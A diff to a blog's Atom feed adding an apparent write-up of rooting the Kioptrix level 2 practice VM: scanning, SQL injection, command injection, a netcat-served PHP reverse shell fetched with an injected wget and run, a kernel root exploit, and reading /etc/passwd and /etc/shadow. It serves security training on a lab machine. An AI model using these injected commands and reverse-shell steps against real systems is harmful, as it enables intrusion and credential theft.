@@ -4,7 +4,7 @@
   <title><![CDATA[My portfolio]]></title>
   <link href="http://paulsec.github.io/atom.xml" rel="self"/>
   <link href="http://paulsec.github.io/"/>
-  <updated>2014-04-15T21:00:56+02:00</updated>
+  <updated>2014-04-15T23:16:23+02:00</updated>
   <id>http://paulsec.github.io/</id>
   <author>
     <name><![CDATA[Paul A. (PaulSec)]]></name>
@@ -12,6 +12,137 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Kioptrix 2: Write-up]]></title>
+    <link href="http://paulsec.github.io/blog/2014/04/15/kioptrix-2-write-up/"/>
+    <updated>2014-04-15T22:51:56+02:00</updated>
+    <id>http://paulsec.github.io/blog/2014/04/15/kioptrix-2-write-up</id>
+    <content type="html"><![CDATA[<p><strong>This post contains the steps to get a root shell with Kioptrix level 2 VM</strong></p>
+
+<p>This VM can he found <a href="http://vulnhub.com/entry/kioptrix-level-11-2,23/">here</a>. Have a look to find even more VMs</p>
+
+<h3><strong>Host discovery</strong></h3>
+
+<p>First, we need to discover where the machine is on our network.
+To do so, let&rsquo;s use Nmap:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sP 192.168.1.1/24 </span></code></pre></td></tr></table></div></figure>
+
+
+<h3><strong>Fingerprinting</strong></h3>
+
+<p>After getting the IP address, we need to do some fingerprinting.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -sV 192.168.1.42</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://paulsec.github.io/images/kioptrix/2/nmap-result.png" width="75%" height="75%"/></p>
+
+<p><em>Fig. Nmap scan result</em></p>
+
+<p>As I saw it in the scan report, I decided to scan the port 80 with <strong>Nikto</strong>.</p>
+
+<p><img src="http://paulsec.github.io/images/kioptrix/2/nikto-result.png" width="75%" height="75%"/></p>
+
+<p><em>Fig. Nikto report on ports 80 (HTTP)</em></p>
+
+<p>There was no vulnerable web application or any interesting file.
+So, I decided to check the Web application.</p>
+
+<h3><strong>Exploitation</strong></h3>
+
+<p>When you arrive on the Index page, you have a login page.
+No Stylesheet file, etc. So I decided to check if the login form was vulnerable to SQL injection..</p>
+
+<p><img src="http://paulsec.github.io/images/kioptrix/2/login-sqli.png" width="40%" height="40%"/></p>
+
+<p><em>Fig. Testing SQL Injection in Login form</em></p>
+
+<p><strong>Bingo, it was ! </strong></p>
+
+<p>Thanks to this flaw, we had access to a &ldquo;admin panel&rdquo; to launch <em>ping</em> commands.
+Seems there might be a Command Execution vulnerability.</p>
+
+<p>I tried using payload like : <code>; ls</code></p>
+
+<p>And guess what ? It worked !</p>
+
+<p>Then, let&rsquo;s get the <code>/etc/passwd</code> file.</p>
+
+<p><img src="http://paulsec.github.io/images/kioptrix/2/command-exec-etc-passwd-cmd.png" width="75%" height="75%"/></p>
+
+<p><em>Fig. Command injected to display /etc/passwd</em></p>
+
+<p>And the result :</p>
+
+<p><img src="http://paulsec.github.io/images/kioptrix/2/command-exec-etc-passwd.png" width="75%" height="75%"/></p>
+
+<p><em>Fig. Output when using the Command exec to display /etc/passwd</em></p>
+
+<p>After this, we were able to launch commands on the system but the shell was under apache&rsquo;s user. No privilege..</p>
+
+<h3><strong>Privilege Escalation</strong></h3>
+
+<p>The final step was to find a local root exploit that we could use.</p>
+
+<p>By typing <code>uname -a</code> command, I found a corresponding exploit : <a href="http://www.exploit-db.com/exploits/9542/">Linux Kernel 2.6 &lt; 2.6.19 &ndash; (32bit) ip_append_data() ring0 Root Exploit</a></p>
+
+<p>However, we didn&rsquo;t have write access in the current folder, so let&rsquo;s download it in <code>/tmp</code>.</p>
+
+<p>Moreover, a fun trick would be to get a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP Reverse Shell</a>.
+Download it, change the configuration, send it using Netcat / wget like this :</p>
+
+<p>On your host machine :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat php-reverse-shell.php | nc -l 8080</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And using the command execution vulnerability, download the file:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>; wget 192.168.1.1:8080 -O /tmp/shell.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And launch the shell :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>; php /tmp/shell.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And you got a reverse shell (:&ndash;)) on your machine :</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+</span><span class='line'> 12:59:24 up  3:51,  0 users,  load average: 0.07, 0.09, 0.03
+</span><span class='line'>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
+</span><span class='line'>sh: no job control in this shell
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Then, download the Root exploit, compile it, run it and you&rsquo;re root.</p>
+
+<p><img src="http://paulsec.github.io/images/kioptrix/2/privilege-escalation-root-id.png" width="75%" height="75%"/></p>
+
+<p><em>Fig. Exploit worked and we&rsquo;re now root</em></p>
+
+<p>Then, we read the <strong>/etc/shadow</strong> :</p>
+
+<p><img src="http://paulsec.github.io/images/kioptrix/2/root-etc-shadow.png" width="75%" height="75%"/></p>
+
+<p><em>Fig. /etc/shadow from the vulnerable machine</em></p>
+
+<p>Hope you liked it and good evening !</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Exploit KB Vulnerable Web App 1: Write-up]]></title>
